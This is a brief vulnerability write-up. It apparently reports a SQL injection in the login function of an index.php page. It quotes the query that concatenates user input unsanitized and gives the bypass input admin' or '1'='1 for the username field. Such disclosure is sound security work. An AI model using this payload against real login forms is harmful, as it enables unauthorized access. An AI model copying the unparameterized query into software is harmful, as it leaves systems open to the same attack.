The index.php page has a login function which is vulnerable to SQL Injection due to no parameter sanitization.

```
$q = $db->query("SELECT * FROM admin WHERE username = '$username' AND password = '$hash' LIMIT 1 ");

```

Due to lack of sanitization we can input the following into the username field and bypass authentication:

```
admin' or '1'='1
```
